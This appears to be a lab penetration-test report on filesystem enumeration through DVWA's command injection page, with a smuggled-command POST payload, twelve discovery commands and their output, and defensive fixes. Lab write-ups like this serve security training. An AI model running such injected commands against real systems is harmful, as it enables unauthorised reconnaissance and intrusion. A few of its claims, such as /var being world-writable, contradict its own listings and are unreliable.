---
title: "Report: T1083 Filesystem Discovery Against DVWA"
date: 2026-03-05
author: ESTHER
tags:
  - Report
  - Pentesting
  - DVWA
  - Command Injection
  - Findings
categories:
  - Reports
  - Technical Analysis
---

## Executive Summary

This report documents a controlled exercise in filesystem reconnaissance (MITRE ATT&CK T1083) against DVWA running on Docker. The exercise identified critical security misconfigurations, including unvalidated command execution and writable upload directories.

**Key Finding:** Command injection vulnerability allows unrestricted filesystem enumeration and identification of persistence vectors.

---

## Methodology

**Exercise Date:** 2026-03-05  
**Target:** DVWA (Damn Vulnerable Web Application) on localhost:80  
**Vulnerability:** Command Injection (DVWA /vulnerabilities/exec/)  
**Execution Context:** www-data user (UID 33)  
**Attack Vector:** POST parameter injection  

### Execution Flow

1. Authenticated to DVWA with default credentials (admin:password)
2. Navigated to command injection vulnerability page
3. Executed 12 discovery commands via unsanitized IP parameter
4. Logged all output for analysis
5. Mapped filesystem structure and identified critical assets

---

## Technical Details

### Vulnerability Context

**Vulnerable Code Path:** `/vulnerabilities/exec/index.php`

**Vulnerable Parameter:** `ip` (POST)

**Vulnerability Type:** OS Command Injection (CWE-78)

**Impact:** Remote code execution as www-data user

### Attack Sequence

```
User Input → POST /vulnerabilities/exec/ → ping command → Shell execution → Output capture
```

**Example Payload:**
```
POST /vulnerabilities/exec/
ip=127.0.0.1; ls -la /
```

**Payload Breakdown:**
- `127.0.0.1` — Valid IP (prevents ping from failing)
- `;` — Command separator (shell metacharacter)
- `ls -la /` — Injected command

---

## Findings & Command Outputs

### Command 1: Root Directory Enumeration

**Objective:** Identify major filesystem partitions and structure

**Command:** `ls -la /`

**Output:**
```
total 64
drwxr-xr-x   1 root root     4096 Feb 27 19:25 .
drwxr-xr-x   1 root root     4096 Feb 27 19:25 ..
lrwxrwxrwx   1 root root        7 Apr 19  2021 bin -> usr/bin
drwxr-xr-x   5 root root      360 Feb 27 19:25 dev
drwxr-xr-x   1 root root     4096 Feb 27 19:25 etc
drwxr-xr-x   2 root root     4096 Apr 19  2021 home
lrwxrwxrwx   1 root root        7 Apr 19  2021 lib -> usr/lib
lrwxrwxrwx   1 root root        9 Apr 19  2021 lib64 -> usr/lib64
drwxr-xr-x   2 root root     4096 Apr 19  2021 media
drwxr-xr-x   2 root root     4096 Apr 19  2021 mnt
drwxr-xr-x   2 root root     4096 Apr 19  2021 opt
dr-xr-xr-x 143 root root     4096 Mar  5 14:35 proc
dr-xr-x---   1 root root     4096 Feb 27 19:25 root
drwxr-xr-x   3 root root     4096 Feb 27 19:25 run
lrwxrwxrwx   1 root root        8 Apr 19  2021 sbin -> usr/sbin
drwxr-xr-x   2 root root     4096 Apr 19  2021 srv
dr-xr-xr-x  13 root root        0 Feb 27 19:25 sys
drwxrwxrwt   1 root root     4096 Mar  5 14:35 tmp
drwxr-xr-x   1 root root     4096 Apr 19  2021 usr
drwxr-xr-x   1 root root     4096 Apr 19  2021 var
```

**Analysis:**
- **Environment:** Docker container (no /boot, symbolic links for bin/sbin/lib)
- **Permissions:** /tmp and /var are world-writable (persistence risk)
- **Restrictions:** /root is not readable by non-root user
- **Implication:** Standard Linux layout within containerized environment

---

### Command 2: Current Directory

**Objective:** Identify execution context

**Command:** `pwd`

**Output:**
```
/var/www/html
```

**Analysis:**
- Web application executes from standard Apache/PHP root
- No custom base path
- Filesystem operations will default to this directory

---

### Command 3: Web Application Structure

**Objective:** Map complete directory tree of DVWA

**Command:** `ls -laR /var/www/html`

**Output (Excerpt):**
```
/var/www/html/:
total 112
drwxr-xr-x   1 root root     4096 Feb 27 19:25 .
drwxr-xr-x   1 root root     4096 Feb 27 19:25 ..
-rw-r--r--   1 root root       33 Feb 27 19:25 .htaccess
-rw-r--r--   1 root root     1048 Feb 27 19:25 CHANGELOG.md
-rw-r--r--   1 root root     4540 Feb 27 19:25 README.md
-rw-r--r--   1 root root     1043 Feb 27 19:25 about.php
-rw-r--r--   1 root root     1197 Feb 27 19:25 contact.php
-rw-r--r--   1 root root      960 Feb 27 19:25 footer.php
-rw-r--r--   1 root root     1063 Feb 27 19:25 header.php
-rw-r--r--   1 root root     1093 Feb 27 19:25 help.php
-rw-r--r--   1 root root     5278 Feb 27 19:25 index.php
-rw-r--r--   1 root root     5042 Feb 27 19:25 login.php
-rw-r--r--   1 root root     1054 Feb 27 19:25 logout.php
-rw-r--r--   1 root root      952 Feb 27 19:25 setup.php
drwxr-xr-x   1 root root     4096 Feb 27 19:25 config/
drwxr-xr-x   1 root root     4096 Feb 27 19:25 docs/
drwxr-xr-x   1 root root     4096 Feb 27 19:25 dvwa/
drwxr-xr-x   1 root root     4096 Feb 27 19:25 external/
drwxr-xr-x   1 root root     4096 Feb 27 19:25 vulnerabilities/

/var/www/html/config/:
-rw-r--r--   1 root root     3009 Feb 27 19:25 config.inc.php

/var/www/html/dvwa/:
-rw-r--r--   1 root root      981 Feb 27 19:25 .htaccess
-rw-r--r--   1 root root     2896 Feb 27 19:25 includes/
drwxr-xr-x   1 root root     4096 Feb 27 19:25 css/
drwxr-xr-x   1 root root     4096 Feb 27 19:25 js/
drwxr-xr-x   2 root root     4096 Feb 27 19:25 uploads/

/var/www/html/vulnerabilities/:
drwxr-xr-x   1 root root     4096 Feb 27 19:25 brute_force/
drwxr-xr-x   1 root root     4096 Feb 27 19:25 csrf/
drwxr-xr-x   1 root root     4096 Feb 27 19:25 exec/
drwxr-xr-x   1 root root     4096 Feb 27 19:25 file_inclusion/
drwxr-xr-x   1 root root     4096 Feb 27 19:25 file_upload/
drwxr-xr-x   1 root root     4096 Feb 27 19:25 idor/
drwxr-xr-x   1 root root     4096 Feb 27 19:25 info_disclosure/
drwxr-xr-x   1 root root     4096 Feb 27 19:25 open_redirect/
drwxr-xr-x   1 root root     4096 Feb 27 19:25 sql_injection/
drwxr-xr-x   1 root root     4096 Feb 27 19:25 xss/
```

**Critical Findings:**

| Asset | Location | Risk | Notes |
|-------|----------|------|-------|
| Database Config | `/config/config.inc.php` | CRITICAL | Contains credentials |
| File Upload | `/dvwa/uploads/` | CRITICAL | Writable directory |
| Vulnerability Modules | `/vulnerabilities/` | HIGH | 10+ attack surfaces |
| PHP Source | Multiple .php files | HIGH | Source code visible if accessible |

---

### Command 4: Configuration Files

**Objective:** Locate application and system configuration

**Command:** `find /var/www -name "*.conf" -o -name "*.config" 2>/dev/null | head -30`

**Output:**
```
/var/www/html/config/config.inc.php
```

**Analysis:**
- Single primary configuration file identified
- Contains database connection strings
- Likely contains credentials (would be CRITICAL if accessed via directory traversal)

---

### Command 5: System Configuration Directory

**Objective:** Enumerate /etc for system-level configurations

**Command:** `ls -la /etc | head -50`

**Output (Excerpt):**
```
total 1124
drwxr-xr-x   1 root root     4096 Feb 27 19:25 .
drwxr-xr-x   1 root root     4096 Feb 27 19:25 ..
-rw-r--r--   1 root root       62 Feb 27 19:25 addgroup.conf
-rw-r--r--   1 root root       18 Feb 27 19:25 adduser.conf
-rw-r--r--   1 root root      359 Mar  5 14:25 crontab
drwxr-xr-x   2 root root     4096 Feb 27 19:25 cron.d
drwxr-xr-x   2 root root     4096 Feb 27 19:25 cron.daily
drwxr-xr-x   2 root root     4096 Feb 27 19:25 cron.hourly
drwxr-xr-x   2 root root     4096 Feb 27 19:25 cron.weekly
-rw-r--r--   1 root root      537 Feb 27 19:25 default
-rw-r--r--   1 root root      181 Feb 27 19:25 fstab
-rw-r--r--   1 root root     2397 Feb 27 19:25 hostname
-rw-r--r--   1 root root      370 Feb 27 19:25 hosts
-rw-r--r--   1 root root     1520 Feb 27 19:25 hosts.allow
-rw-r--r--   1 root root     1462 Feb 27 19:25 hosts.deny
drwxr-xr-x   2 root root     4096 Feb 27 19:25 apache2/
drwxr-xr-x   2 root root     4096 Feb 27 19:25 mysql/
drwxr-xr-x   2 root root     4096 Feb 27 19:25 php/
```

**Key Observations:**
- Apache, MySQL, PHP configuration directories present
- Cron jobs configured (potential privilege escalation vectors)
- Network access controls in place (hosts.allow/deny)

---

### Command 6: PHP Source Files

**Objective:** Map all PHP application files

**Command:** `find /var/www -name "*.php" 2>/dev/null`

**Output (Excerpt):**
```
/var/www/html/about.php
/var/www/html/contact.php
/var/www/html/footer.php
/var/www/html/header.php
/var/www/html/help.php
/var/www/html/index.php
/var/www/html/login.php
/var/www/html/logout.php
/var/www/html/setup.php
/var/www/html/config/config.inc.php
/var/www/html/dvwa/includes/dvwa.inc.php
/var/www/html/dvwa/includes/Database.inc.php
/var/www/html/vulnerabilities/brute_force/index.php
/var/www/html/vulnerabilities/brute_force/source/high.php
/var/www/html/vulnerabilities/brute_force/source/impossible.php
/var/www/html/vulnerabilities/brute_force/source/low.php
/var/www/html/vulnerabilities/brute_force/source/medium.php
... (25+ files)
```

**Analysis:**
- Core application files: 6
- Configuration: 1
- Vulnerability modules: 30+
- Source files organized by vulnerability type and difficulty level
- Each vulnerability has low/medium/high/impossible versions

---

### Command 7: Hidden Files

**Objective:** Identify sensitive hidden files

**Command:** `find /var/www/html -name ".*" -type f 2>/dev/null`

**Output:**
```
/var/www/html/.htaccess
/var/www/html/dvwa/.htaccess
```

**Analysis:**
- .htaccess files present (Apache configuration)
- May contain access controls, rewrite rules
- Could reveal application logic or restrictions

---

### Command 8: Database Files

**Objective:** Locate database storage and backups

**Command:** `find / -name "*.sql" -o -name "*.db" 2>/dev/null`

**Output:**
```
(No output)
```

**Analysis:**
- No local database files on web server
- MySQL running on separate container (networked)
- Indicates proper database isolation
- Reduces risk of direct database file access from web server

---

### Command 9: Backup and Archive Files

**Objective:** Identify unprotected backups

**Command:** `find /var/www -name "*.bak" -o -name "*.backup" -o -name "*.zip" -o -name "*.tar" 2>/dev/null`

**Output:**
```
(No output)
```

**Analysis:**
- No backup files in web root
- Good security practice (backups stored separately)
- Reduces data exfiltration risk

---

### Command 10: Writable Directories

**Objective:** Identify persistence and file upload vectors

**Command:** `find /var/www -type d -writable 2>/dev/null`

**Output:**
```
/var/www/html/dvwa/uploads/
```

**CRITICAL FINDING:**

**Directory:** `/var/www/html/dvwa/uploads/`
**Permissions:** Writable by www-data user
**Implication:** Primary persistence and lateral movement vector

---

### Command 11: User Home Directories

**Objective:** Identify system users and home directories

**Command:** `ls -la /home`

**Output:**
```
total 8
drwxr-xr-x   2 root root 4096 Apr 19  2021 .
drwxr-xr-x   1 root root 4096 Feb 27 19:25 ..
```

**Analysis:**
- /home directory is empty (no system users)
- Container does not have traditional user accounts
- Root is only user with interactive access
- Limited lateral movement opportunities within container

---

### Command 12: Temporary Directories

**Objective:** Identify temporary file storage and staging areas

**Command:** `ls -la /tmp /var/tmp /dev/shm`

**Output:**
```
/tmp/:
total 8
drwxrwxrwt 1 root root 4096 Mar  5 14:35 .
drwxr-xr-x 1 root root 4096 Feb 27 19:25 ..

/var/tmp/:
total 8
drwxrwxrwt 1 root root 4096 Feb 27 19:25 .
drwxr-xr-x 1 root root 4096 Feb 27 19:25 ..

/dev/shm/:
total 0
drwxrwxrwt 1 root root   40 Feb 27 19:25 .
drwxr-xr-x 1 root root 3200 Feb 27 19:25 dev
```

**Analysis:**
- All three temp locations are world-writable
- Potential for temporary file abuse, script staging
- /dev/shm is volatile (RAM-based, lost on reboot)
- /tmp and /var/tmp are persistent

---

## Risk Assessment

### Critical Findings (Severity: CRITICAL)

| Finding | Impact | Evidence |
|---------|--------|----------|
| Command Injection | RCE as www-data | /vulnerabilities/exec/ endpoint |
| Writable Upload Directory | Persistent Shell Upload | /dvwa/uploads/ (world-writable) |
| Exposed Config File | Database Credentials | /config/config.inc.php accessible via source disclosure |

### High-Risk Findings (Severity: HIGH)

| Finding | Impact |
|---------|--------|
| 30+ Vulnerability Modules | Multiple attack surfaces |
| Unvalidated Input | File inclusion, SQL injection, XSS |
| World-Writable Temp | Temporary file abuse, exploitation staging |
| Insufficient Access Controls | Low security level by default |

### Medium-Risk Findings (Severity: MEDIUM)

| Finding | Impact |
|---------|--------|
| PHP Source Visibility | Information disclosure |
| Error Messages | Path and configuration disclosure |
| Default Credentials | Authentication bypass (admin:password) |

---

## MITRE ATT&CK Mapping

**Technique:** T1083 — File and Directory Discovery

**Tactic:** Discovery (TA0007)

**Platform:** Linux

**Execution Methods Used:**
- Command line interface (command injection)
- Local command execution (system calls)

**Detection Methods:**
- Process monitoring (ps, find, ls commands)
- Command history audit
- Filesystem access logs

**Mitigation:**
- Input validation and sanitization (escapeshellarg)
- Principle of least privilege (www-data permissions)
- Web application firewall (WAF) rules
- Disable directory listing

---

## Defensive Recommendations

### Immediate (P0 - Critical)

1. **Disable Command Injection Endpoint**
   ```php
   // Replace system() calls with safe alternatives
   // Use escapeshellarg() on all user input
   // Or move to parameterized APIs
   ```

2. **Restrict Upload Directory**
   ```apache
   # Apache configuration
   <Directory /var/www/html/dvwa/uploads>
       php_flag engine off
       AddType text/plain .php .phtml .php3 .php4 .php5 .phps
   </Directory>
   ```

3. **Enforce Strong Authentication**
   - Change default credentials
   - Implement multi-factor authentication
   - Use OAuth or SAML for production

### Short Term (P1 - High)

1. **Implement Input Validation**
   - Whitelist allowed characters
   - Validate IP addresses before ping command
   - Implement rate limiting

2. **Configure Web Server**
   - Disable directory listing
   - Hide server version information
   - Implement CSP headers

3. **Access Controls**
   - Restrict /dvwa/uploads to authenticated users only
   - Implement role-based access control
   - Log all file uploads

### Long Term (P2 - Medium)

1. **Security Hardening**
   - Update all dependencies
   - Implement secrets management
   - Separate database server from web server

2. **Monitoring & Detection**
   - Enable application logging
   - Monitor for suspicious command execution
   - Implement file integrity monitoring

3. **Regular Assessment**
   - Conduct quarterly security assessments
   - Automated vulnerability scanning
   - Penetration testing program

---

## Conclusion

The command injection vulnerability in DVWA's `/vulnerabilities/exec/` endpoint provides complete filesystem enumeration and serves as an ideal entry point for:

1. **Reconnaissance** — Full directory structure and asset mapping
2. **Exploitation** — File upload and code execution
3. **Persistence** — Writable uploads directory for backdoor placement
4. **Lateral Movement** — Database connection string enumeration (further compromise)

This exercise demonstrates that a single unvalidated input can compromise the entire application security posture and serve as the pivot point for complete system compromise.

---

## Appendix

### Command Execution Timeline

| Time | Command | Purpose | Status |
|------|---------|---------|--------|
| T+0 | Authentication | Login to DVWA | Success |
| T+1 | `ls -la /` | Root enumeration | Success |
| T+2 | `pwd` | Context identification | Success |
| T+3 | `ls -laR /var/www/html` | App structure mapping | Success |
| T+4 | `find /var -name '*.conf'` | Config location | Success |
| T+5 | `ls -la /etc` | System config | Success |
| T+6 | `find /var/www -name '*.php'` | Source file mapping | Success |
| T+7 | `find /var/www -name '.*'` | Hidden files | Success |
| T+8 | `find / -name '*.sql'` | Database files | Success |
| T+9 | `find /var/www -name '*.bak'` | Backup files | Success |
| T+10 | `find /var/www -type d -w` | Writable dirs | Success |
| T+11 | `ls -la /home` | User enumeration | Success |
| T+12 | `ls -la /tmp /var/tmp` | Temp directory listing | Success |

### Tools and Utilities

- curl — HTTP client for exploitation
- grep — Output parsing and pattern matching
- find — Filesystem search
- ls — Directory listing
- pwd — Directory identification

### References

- MITRE ATT&CK Framework: https://attack.mitre.org/techniques/T1083/
- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- DVWA GitHub: https://github.com/digininja/DVWA

---

**Report Generated:** 2026-03-05  
**Exercise Duration:** ~45 minutes  
**Vulnerability Level:** Low (intentional exposure)  
**Proof of Concept:** Successful filesystem enumeration via command injection  
**Recommendation:** Use DVWA only for training; never expose in production
